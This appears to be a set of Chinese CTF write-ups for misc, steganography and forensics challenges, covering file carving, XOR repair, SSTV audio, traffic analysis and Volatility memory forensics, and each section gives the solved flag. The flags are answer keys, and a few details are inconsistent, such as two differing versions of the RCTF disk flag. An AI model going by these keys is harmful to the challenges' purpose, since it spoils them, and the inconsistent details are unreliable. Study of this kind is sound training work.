得到 `btdipdun`，因为提示说可读短句，稍作修正后可得到 `ctfisfun`。将其作为密码提取图片中的隐写即可得到 flag 文件。

```flag
flag{Pudd1n!!_y0u_F1nd_m3!}
```

### 派大星的烦恼

根据题目描述，在图片中找到区块并复制出来得到字符串。

```text
"DD"DD""""D"DD""""""DD"""DD"DD""D""DDD""D"D"DD""""""DD""D""""DD"D"D"DD""""D"DD""D"""DD"""""DDD""""D"DD"""D"""DD"""D""DD"D"D"DD"""DD""DD"D"D""DD""DD"DD"""D"""DD""DD"DD""D"D""DD"D"D"DD"""D"""DD"""D"DD""DD"""DD"D"D""DD"""D"DD""DD""DD"""""DDD""DD""DD"""D""DD""
```

将其转换为二进制字符串，得到了如下内容。

```text
0110110000101100000011000110110010011100101011000000110010000110101011000010110010001100000111000010110001000110001001101010110001100110101001100110110001000110011011001010011010101100010001100010110011000110101001100010110011001100000111001100110001001100
```

接下来要做的就是想办法把它转换为字符串，经过尝试得出 `reverse->From Binary->reverse` 的路径，得出正确的 flag。

```flag
flag{6406950a54184bd5fe6b6e5b4ce43832}
```

### [MRCTF2020]Hello_ misc(图片隐写，ttl隐写，sublime高亮找规律)

010 editor 打开解压出的图片，发现文件尾部有个压缩包，提取出来之后发现压缩包需要密码。将图用 StegSolve 可解得另一张图片。

![img](assets/0f349e230e15583731d564f4d4f5634e.png)

将其保存下来，打开查看发现压缩包密码信息。

![img](assets/2547c757191859f9b316bf3f6ccad0c4.png)

将压缩包解压之后得到了很多数字，看形式像 TTL 信息隐写。用脚本跑出信息 `rar-passwd:0ac1fe6b77be5dbe`。依此解开 rar 压缩文档之后得到一个 Word 文档。修正其拓展名后打开，得到一串 base64。

```text
MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx
MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx
MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx
MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx
MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx
MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx
```

对其逐行解密后得到如下内容。

```text
110110111111110011110111111111111111111111111111101110000001111111111001101
110110110001101011110111111111111111111111111111111101111111111111110110011
110000101110111011110111111100011111111111001001101110000011111000011111111
110110100001111011110111111011101111111110110110101111111100110111111111111
110110101111111011110111101011101111111110110110101101111100110111111111111
110110100001100000110000001100011100000110110110101110000001111000011111111
```

高亮字符，可以更直观看到

![image-20231204165448316](assets/image-20231204165448316.png)

```text
flag{He1Lo_mi5c~}
```

### [BSidesSF2019]zippy

Wireshark 分析流量包，追踪 TCP 流量，可以直接看到压缩文档和压缩文档的密码，提取出来解压文档即可得到 flag 文件。

![image-20231204165651999](assets/image-20231204165651999.png)

```flag
CTF{this_flag_is_your_flag}
```

### 粽子的来历(word文档修复，MD5)

题给了四个损坏的压缩包

[![img](assets/2627265-20220130021142891-1054074957.png)](https://img2022.cnblogs.com/blog/2627265/202201/2627265-20220130021142891-1054074957.png)

没做过类似的题 遂上网搜wp

将'IComeFromAlibaba'都改为'ÿ'

[![img](assets/2627265-20220130021335241-1201853833.png)](https://img2022.cnblogs.com/blog/2627265/202201/2627265-20220130021335241-1201853833.png)

修改后可正常打开

间距大的为1 较小的为0

[![img](assets/2627265-20220130021932936-1731535516.png)](https://img2022.cnblogs.com/blog/2627265/202201/2627265-20220130021932936-1731535516.png)

然后根据题目提示用MD5加密

[![img](assets/2627265-20220130022019624-1169034296.png)](https://img2022.cnblogs.com/blog/2627265/202201/2627265-20220130022019624-1169034296.png)

取32位 小写(记得去空格

[![img](assets/2627265-20220130022044424-1064564188.png)](https://img2022.cnblogs.com/blog/2627265/202201/2627265-20220130022044424-1064564188.png)

 flag{d473ee3def34bd022f8e5233036b3345}



### [UTCTF2020]file header（修复png文件头）

修复附件的 PNG 文件头 `89 50 4E 47`，查看图片可得 flag。

```flag
utflag{3lit3_h4ck3r}
```

### [WUSTCTF2020]spaceclub

打开文件后全选可见长短错落的空格。

![img](assets/b93eb46ae3d1f7c5448fadffb75993ea.png)

将短行转换为 0，长行转换为 1，得到如下字符。

```text
011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101
```

将其转换为十六进制可得 flag。

```flag
wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}
```

### [ACTF新生赛2020]music(文件异或)

010 editor 打开文件看到文件头为 `A1 A1 A1` 但是 m4a 的文件头应该为 `00 00 00`，于是猜测其对文件进行了异或运算。将文件导入 CyberChef 中进行异或得到原文件。打开文件即可听出 flag。

```flag
actf{abcdfghijk}
```

### [UTCTF2020]basic-forensics

修正文件拓展名，搜索 flag 即可。

```flag
utflag{fil3_ext3nsi0ns_4r3nt_r34l}
```

### [SCTF2019]电单车

这题是真的少信息了，原本应该有个题目描述的。要找的是信号的地址位的 20bit。使用 Audition 转写即可得到 flag。

```flag
flag{01110100101010100110}
```

### hashcat

010 editor 打开文件后补全拓展名。使用 AOPR 进行密码爆破得到密码为 9919。

![img](assets/7f41922820b76752dc6049e86da39768.png)

尝试后修正拓展名为 ppt，使用 PowerPoint 打开文件后在倒数第二页可找到 flag。

```flag
Flag{okYOUWIN}
```

### 真的很杂

`binwalk -e` 分离出一个 apk 文件，使用 apktool 反编译文件。

![img](assets/3dad675b1190361c576a02db29b13136.png)

查看 MainActivity.smali 可以看到如下内容。

```text
.line 32
    .local v6, "text":Landroid/widget/TextView;
    const-string v0, "flag{25f991b27f"

    .line 33
    .local v0, "True1":Ljava/lang/String;
    const-string v1, "c"

    .line 34
    .local v1, "True2":Ljava/lang/String;
    const-string v2, "dc2f7a82a2b34"

    .line 35
    .local v2, "True3":Ljava/lang/String;
    const-string v3, "3"

    .line 36
    .local v3, "True4":Ljava/lang/String;
    const-string v4, "86e81c4}"
```

拼接起来即得到 flag。

```flag
flag{25f991b27fcdc2f7a82a2b34386e81c4}
```

### [湖南省赛2019]Findme

解压得到五个图片，分别从五个图片中得到 flag 的一部分。

在第二幅图的文件尾部有一个压缩文档，文件头以 7z 开头，可是之后却是 `03 04` 于是猜测其实是个 zip 文档。将 7z 都替换为 PK 以修正文档。修正之后解压文档得到一堆文本文档，推测有用的信息大小不一样，于是将其按大小排序，找到 618.txt。其中包含信息如下。

```text
You find it: 1RVcmVfc
```

第五幅图的尾部有如下信息。

```text
I give U a gift:Yzcllfc0lN
```

第四幅图的尾部有如下信息。

```text
another part:cExlX1BsY
```

第三幅图用 010 editor 打开的时候运行模板会因为 CRC 不匹配报错，而这些 CRC 值都只有最后两位，将其提取出来转 ASCII 的带如下信息。

![img](assets/dec67a093accb0b234d5f36fe1f2195c.png)

```text
33 52 6C 5A 33 30 3D --> 3RlZ30=
```

第一幅图打开时发现了 IDAT 缺失的情况，将其补齐修正。

![img](assets/31fb8686c09fa6d93a41cf6c00125216.png)

再使用脚本爆破图片宽高，得到 `('hex:', '0xe3', '0x1c5')`。将图片宽高修正。再使用 StegSolve 可解出一个二维码。

![img](assets/74905bffc068628b815d82d78b69e6c7.png)

修正定位码之后扫描可得如下内容。

```text
ZmxhZ3s0X3
```

将内容片段拼接，base64 解码即可得到 flag。

```text
ZmxhZ3s0X3Yzcllfc0lNcExlX1BsY1RVcmVfc3RlZ30=
flag{4_v3rY_sIMpLe_PlcTUre_steg}
```

### voip(wirshark，voip流量，RTP流)

用[wireshark](https://so.csdn.net/so/search?q=wireshark&spm=1001.2101.3001.7020)打开流量包

![img](assets/9b9182bdaf124fb48d3f51ac08d5f881.png) 然后根据下面的图片导出[RTP](https://so.csdn.net/so/search?q=RTP&spm=1001.2101.3001.7020)流

![img](assets/a20c9cd167664e70adb4dd9c994de647.png)

 之后右键点分析→播放流→一个充满机械感的声音出现惹 念出了flag

![img](assets/a4f50e98eef540098efaebaf427dfb26.png)

得到flag

```flag
seccon{9001IVR}
```

### [UTCTF2020]zero(零宽字符隐写)

打开之后是一段示例文字，但是文件的编码有点不一样。

![img](assets/350c58ce634a8540ec50db75abd86a7f.png)

根据题目暗示，找到[零宽字符隐写](https://330k.github.io/misc_tools/unicode_steganography.html)，解得 flag。

![img](assets/4dd8d289f6b9cb8d3569121a164254ce.png)

```flag
utflag{whyNOT@sc11_4927aajbqk14}
```

### [QCTF2018]X-man-A face（二维码定位符）

解压得到一张图片，上面有一个残缺的二维码，将其定位码修正。

![img](assets/1c0d440471d69515a3b60fcf060fd21f.jpg)

扫描二维码之后得到一串字符串，将其 base32 解码即可得到 flag。

```text
KFBVIRT3KBZGK5DUPFPVG2LTORSXEX2XNBXV6QTVPFZV6TLFL5GG6YTTORSXE7I=
QCTF{Pretty_Sister_Who_Buys_Me_Lobster}
```

### Business Planning Group

使用 010 editor 打开图片可以发现文件尾存在 bpg 图像，将其分离出来。使用[在线的工具](https://webencoder.libbpg.org/show.html)可以将其显示并下载为 png 文件。![img](assets/7fed2d54bb4e08923384c8c6da36c49a.png)

将图片上的文本提取出来并 base64 解码即可得到 flag。

```flag
bsides_delhi{BPG_i5_b3tt3r_7h4n_JPG}
```

### [MRCTF2020]pyFlag（文件拼接，多重编码，base85-->From Hex-->base32-->From Hex-->base64，ciphey秒了）

压缩包解压后为三张图片，使用 010 editor 打开图片发现每张图片的最后都有一部分信息，将其拼起来之后得到一个压缩文档。使用 ARCHPR 爆破出压缩包密码为 1234。

![image-20231204215211910](assets/image-20231204215211910.png)

解压文件后得到加密的 flag。

```text
G&eOhGcq(ZG(t2*H8M3dG&wXiGcq(ZG&wXyG(j~tG&eOdGcq+aG(t5oG(j~qG&eIeGcq+aG)6Q<G(j~rG&eOdH9<5qG&eLvG(j~sG&nRdH9<8rG%++qG%__eG&eIeGc+|cG(t5oG(j~sG&eOlH9<8rH8C_qH9<8oG&eOhGc+_bG&eLvH9<8sG&eLgGcz?cG&3|sH8M3cG&eOtG%_?aG(t5oG(j~tG&wXxGcq+aH8V6sH9<8rG&eOhH9<5qG(<E-H8M3eG&wXiGcq(ZG)6Q<G(j~tG&eOtG%+<aG&wagG%__cG&eIeGcq+aG&M9uH8V6cG&eOlH9<8rG(<HrG(j~qG&eLcH9<8sG&wUwGek2)
```

将其经过 `base85-->From Hex-->base32-->From Hex-->base64` 的解码之后即可得到 flag。

![image-20231204215128447](assets/image-20231204215128447.png)

![image-20231204215225131](assets/image-20231204215225131.png)

```flag
MRCTF{Y0u_Are_4_p3rFect_dec0der}
```

### [ACTF新生赛2020]剑龙（aaencode,steghide,Stegosaurus）

解压得到很多文件，pwd 里有一段 aaencode 的 js 代码，解码后得到 `welcom3!`。将其作为密钥用 Steghide 从图片中解出一段 DES 密文。

```text
U2FsdGVkX1/7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj/Q==
```

结合图片备注中的密钥 `@#$%^&%%$)` 可以解出如下内容。

```text
think about stegosaurus
```

使用 Stegosaurus 工具对 O_O 文件提取数据就能得到 flag。可能是文件有问题，这部分没有复现到。

```flag
flag{3teg0Sauru3_!1}
```

### [GUET-CTF2019]soul sipse（音频 Steghide ）

对音频 Steghide 解隐写解出一个文本，微云下载后的得到一张图片。

![image-20231204215825617](assets/image-20231204215825617.png)

修复图片的文件头，并将图片上的内容转为文本，得到如下内容。

```text
\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a
```

Unescape Unicode Characters 解码得到如下内容。

```text
4070
1234
```

将这两行相加得到 flag。

```flag
flag{5304}
```

### [UTCTF2020]spectogram(audacity频谱图)

音频文件使用 Audition 打开，在频谱部分可以看到 flag。

![image-20231204220544508](assets/image-20231204220544508.png)

```flag
uctflag{sp3tr0gr4m0ph0n3}
```

### [UTCTF2020]File Carving(ida，反编译elf文件)

010 editor 打开文件可以发现文件尾部有压缩包，分离出来解压得到一个 ELF。IDA Pro 打开反编译主程序可看到 flag。

![image-20231204222652312](assets/image-20231204222652312.png)

```flag
utflag{2fbe9adc2ad89c71da48cabe90a121c0}
```

### [RCTF2019]disk(vmdk,fat文件处理，veracrypt工具(不同的密码尽然能开启不同的盘))

我们获得的文件只有一个[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/20200915093127523.png%2523pic_center)](https://img-blog.csdnimg.cn/20200915093127523.png#pic_center)
遇到这种文件，一般都是直接拿去内存取证的，然而我取了半天似乎没有什么有用的信息，然后这种文件是虚拟机里面的文件，请看介绍。

> VMDK：（VMWare Virtual Machine Disk Format）是虚拟机VMware创建的虚拟硬盘格式，文件存在于VMware文件系统中，被称为VMFS（虚拟机文件系统）

这边我也学会一个技巧，遇到vmdk可以试试使用7z这个压缩软件打开[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70%2523pic_center.png)](https://img-blog.csdnimg.cn/20200915093540165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70#pic_center)





分离出这个0.fat，fat这个文件，其实就是一个硬盘可以挂载

> FAT格式： 即FAT16,这是MS－DOS和最早期的Win 95操作系统中最常见的磁盘分区格式。它采用16位的文件分配表，能支持最大为2GB的分区，几乎所有的操作系统都支持这一种格式，从DOS、Win
> 95、Win 97到现在的Win 98、Windows NT、Win
> 2000，但是在FAT16分区格式中，它有一个最大的缺点：磁盘利用效率低。因为在DOS和Windows系统中，磁盘文件的分配是以簇为单位的，一个簇只分配给一个文件使用，不管这个文件占用整个簇容量的多少。这样，即使一个文件很小的话，它也要占用了一个簇，剩余的空间便全部闲置在那里，形成了磁盘空间的浪费。由于分区表容量的限制，FAT16支持的分区越大，磁盘上每个簇的容量也越大，造成的浪费也越大。所以为了解决这个问题，微软公司在Win
> 97中推出了一种全新的磁盘分区格式FAT32。

然后我们使用VeraCrypt，进行挂载
[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70%2523pic_center-170170017146728.png)](https://img-blog.csdnimg.cn/20200915094014929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70#pic_center)
这个挂载密码，RCTF上面是有写上面的，不过应该也不难猜，大家联想一下这个比赛

> password：rctf

[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/20200915094144663.png%2523pic_center)](https://img-blog.csdnimg.cn/20200915094144663.png#pic_center)
到这一步就说明挂载成功，我们打开这个盘看一下
[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70%2523pic_center-170170017146729.png)](https://img-blog.csdnimg.cn/20200915094223724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70#pic_center)[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70%2523pic_center-170170017146830.png)](https://img-blog.csdnimg.cn/20200915094641727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70#pic_center)





发现他有一个图片，和password.txt我当时以为是jpg加密，当时我使用了
silenteye、stegdetect0.4、jphide、Free_File_Camouflage，都不是，后面发现，这个password中的密码，是这个0.fat的隐藏密码

[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/20200915094726876.png%2523pic_center)](https://img-blog.csdnimg.cn/20200915094726876.png#pic_center)
这里就有一个新的知识点，不同的密码尽然能开启不同的盘瞬间智慧得到了升华。[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70%2523pic_center-170170017146831.png)](https://img-blog.csdnimg.cn/20200915094943118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70#pic_center)
安装成功他是打不开的，我们只能通过winhex来查看磁盘，[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70%2523pic_center-170170017146832.png)](https://img-blog.csdnimg.cn/20200915095113585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70#pic_center)
不过winhex一定一定要管理员打开-》打开磁盘-》选择磁盘-》找flag[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/20200915095140271.png%2523pic_center)](https://img-blog.csdnimg.cn/20200915095140271.png#pic_center)[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/20200915095209794.png%2523pic_center)](https://img-blog.csdnimg.cn/20200915095209794.png#pic_center)
[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70%2523pic_center-170170017146833.png)](https://img-blog.csdnimg.cn/20200915095307156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70#pic_center)
[![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70%2523pic_center-170170017146834.png)](https://img-blog.csdnimg.cn/20200915095323507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70#pic_center)
很明显的看到了flag后半段，

> _and_corrupted_1nner_v0lume}

问题就来了，前半段了？？？
然后在重新找一下原来，就在0.fat里面[![在这里插入图片描述](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70%2523pic_center-170170017146835.png)](https://img-blog.csdnimg.cn/20200915095451642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BvbmUyMjMz,size_16,color_FFFFFF,t_70#pic_center)

> rctf{unseCure_quick_form4t_vo1ume
> 结合一下
> rctf{unseCure_quick_form4t_vo1ume_and_corrupted_1nner_v0lume}

又掌握了新知识！

```flag
rctf{unseCure_quick_form4t_vo1umer_and_corrupted_1nner_v0lume}
```

### [HDCTF2019]你能发现什么蛛丝马迹吗(Volatility2分析.img系统镜像文件取证)

拿到memory.img文件，进行取证分析

打开终端，输入

```
 ./volatility.exe -f memory.img imageinfo

```

![image-20231204232926753](assets/image-20231204232926753.png)

首先 `imageinfo` 确定一下 profile。发现是 `Win2003SP0x86, Win2003SP1x86, Win2003SP2x86`

随便选一个开始

##### 查看进程

```
./volatility -f memory.img --profile=Win2003SP1x86 pslist
```

![image-20231204233110769](assets/image-20231204233110769.png)

看完镜像直接查看这个镜像上有那些进程正在运行 pslist应该比较好理解就是进程的列表的意思。

可以看到有许多exe文件，并且最后一个用过的程序名字还是DumpIt这个敏感的名字，
查看cmd命令使用记录

```
./volatility -f memory.img --profile=Win2003SP1x86 cmdscan
```

![image-20231204233220381](assets/image-20231204233220381.png)

发现flag字符，继续

##### 将DumpIt.exe这个程序dump下来

```
./volatility -f memory.img --profile=Win2003SP1x86 memdump -p 1992 --dump-dir=./
```

产生一个1992.dmp文件，010打开

![image-20220403091518438](assets/dce28d026dbbb43a30634cd91b358c47.png)

##### foremost分离

![image-20231204233419997](assets/image-20231204233419997.png)

在分离出来的文件里搜寻，有二维码之类的

![image-20231204233440354](assets/image-20231204233440354.png)

iv是偏移量，有key有字符，有偏移量，是AES加密

```
jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=

key:Th1s_1s_K3y00000

iv:1234567890123456
```

解码得到flag

换个思路：



使用 Volatility2 进行镜像分析。首先 `imageinfo` 确定一下 profile。发现是 `Win2003SP0x86, Win2003SP1x86, Win2003SP2x86`，随便选一个开始 

```cmd
./volatility2 -f memory.img --profile=Win2003SP1x86 filescan | findstr "flag"
#发现flag.png
./volatility2 -f memory.img --profile=Win2003SP1x86 dumpfiles -Q 0x000000000484f900 --dump-dir=./
```

![image-20231204234036815](assets/image-20231204234036815.png)

`filescan | grep 桌面` 看一下桌面的文件，发现一个 flag.png。将其提取出来，扫描发现是一段加密文本，接着回去找密钥。

![image-20231204234256282](assets/image-20231204234256282.png)

首先 `pslist` 一下，发现没有 notepad 等可能读取文本文档的进程，只有 DumpIt.exe 比较可疑。考虑到在桌面发现的图片，将资源管理器的进程一起 dump 下来。使用 binwalk 分析可以发现资源管理器的 dumpfile 里面有好几个图片。

![image-20231204234309411](assets/image-20231204234309411.png)

使用 foremost 将其分离出来，成功发现包含密钥的图片。

![image-20231204234325183](assets/image-20231204234325183.png)

使用 AES 将密文解密即得到 flag。

![image-20231204234338278](assets/image-20231204234338278.png)

```flag
flag{F0uNd_s0m3th1ng_1n_M3mory}
```

### [watevrCTF 2019]Evil Cuteness

010 editor 打开图片可在文件尾部发现压缩文档，分离出来解压即可得到 flag 文件。

![image-20231204235743373](assets/image-20231204235743373.png)

```flag
watevr{7h475_4c7u4lly_r34lly_cu73_7h0u6h}
```

### [BSidesSF2019]table-tennis

Wireshark 打开流量包，跟到 ICMP 流量可以发现 Data 里面有 HTML 文档的数据。

![image-20231204235759047](assets/image-20231204235759047.png)

筛选 `frame.coloring_rule.string == "icmp || icmpv6"` 可以看到流量包中的 ICMP 流量，读末尾的数据可以发现关键数据是一段 base64，将其取出后 base64 解码即可得到 flag。

```flag
CTF{JustAS0ngAb0utP1ngP0ng}
```

### [INSHack2017]sanity

Markdown 文档，打开即可看到 flag。

![image-20231204235812817](assets/image-20231204235812817.png)

```flag
INSA{Youre_sane_Good_for_you}
```

### [INSHack2019]INSAnity

Markdown 文档，打开即可看到 flag。

![image-20231204235824128](assets/image-20231204235824128.png)

```flag
INSA{YouRe_Crazy_and_I_Love_it}
```

### [UTCTF2020]sstv(wav文件隐写，qsstv工具)

又是一道wav隐写题目

audacity打开看波形，竟然是一道平的

![image-20231205000147426](assets/image-20231205000147426.png)

看看频谱

![image-20231205000158984](assets/image-20231205000158984.png)
Kali安装QSSTV

    apt-get install qsstv

下载好后，在终端输入qsstv，系统自动打开qsstv，然后点击Options->configuration->sound->sound input->from file

![image-20231205000246994](assets/image-20231205000246994.png)

点击OK,然后点击这个按钮，选择要解码的文件，然后就开始解码啦
解码

![image-20231205000302659](assets/image-20231205000302659.png)

![image-20231205000320933](assets/image-20231205000320933.png)
3.flag

flag{6bdfeac1e2baa12d6ac5384cdfd166b0}

### [INSHack2019]Sanity

Markdown 文档，打开即可看到 flag。

![image-20231205000437508](assets/image-20231205000437508.png)

```flag
INSA{Welcome}
```

### [INSHack2017]insanity-

Markdown 文档，打开即可看到 flag。

```flag
INSA{Youre_crazy_I_like_it}
```

### [GUET-CTF2019]520的暗示(文件异或，恢复jpg文件)

#### 2.解题过程

这个题目名称好有意思010打开，

![image-20220416151753246](assets/ecd3508b6bd44aa4685e5effdd20bfd6.png)

photo.dat，那应该和图片有关系，分析开头和结尾

![image-20231205000855941](assets/image-20231205000855941.png)

有点类似于jpg的FFD8FF文件头和FFD9文件尾诶，那要怎么样转换成jpg格式呢？想到了那几个常用的计算方法——二进制与，二进制或，二进制异或和二进制反转,优先考虑异或，这个比较常见，CC和FF的二进制分别是：

CC 11001100

FF 11111111

CC^x=11111111

    异或运算符是这个意思，参与运算的两个值，如果两个相应bit位相同，则结果为0，否则为1
    
    （1） 00=0，01=1 0异或任何数＝任何数
    
    （2） 10=1，11=0 1异或任何数－任何数取反
    
    （3） 任何数异或自己＝把自己置0

这样就可以一位位地推导出x是多少了,1-8位x与CC的bit位全是不同的，这就很简单，x应该是

00110011，转换成16进制就是33

![image-20231205001052579](assets/image-20231205001052579.png)

与33异或

010

![image-20231205001120148](assets/image-20231205001120148.png)

![image-20231205001142487](assets/image-20231205001142487.png)

看起来很成功

![image-20231205001153488](assets/image-20231205001153488.png)

保存，修改后缀为jpg，打开，
![image-20231205001208350](assets/image-20231205001208350.png)

```flag
flag{桂林电子科技大学花江校区}
```

### [CFI-CTF 2018]webLogon capture

Wireshark 分析数据包，看请求可得一串字符串，URL Decode 之后可以得到 flag。

```flag
CFI{1ns3cur3_l0g0n}
```

### key不在这里

解压得到的图片

![image-20231205001655299](assets/image-20231205001655299.png)

扫码扫不出来，于是拿到stegsolve去调调颜色通道，达到反色效果

![image-20231205001853924](assets/image-20231205001853924.png)

再去工具箱识别，就可以了，扫码得到：

```text
https://cn.bing.com/search?q=key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&m=10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&qs=n&form=QBRE&sp=-1&sc=0-38&sk=&cvid=2CE15329C18147CBA4C1CA97C8E1BB8C
```

将其中的 `m` 取出来并整理分组，经过 `From Decimal --> URL Decode` 的路径解码后可得 flag。

```flag
flag{5d45fa256372224f48746c6fb8e33b32}
```

### 很好的色彩呃？

解压得到一张图片，取色器看每部分黄绿色的颜色可知只有最后两位有差别，因此将其取出来

![image-20231207185710522](assets/image-20231207185710522.png)

```text
61 61 70 6a 65 73
```

将其从十六进制转十进制即得 flag。

```flag
flag{aapjes}
```

### [MRCTF2020]摇滚DJ（建议大声播放

附件是一段音频，RX-SSTV 接收可以得到 flag。

![image-20231207190617743](assets/image-20231207190617743.png)

```flag
merak{r3ce1ved_4n_img}
```

### [INSHack2018]Self Congratulation

附件是一张图片，左上角有黑白相间的方块。

![image-20231205002403402](assets/image-20231205002403402.png)

将其转译为二进制数据得到如下内容。

```text
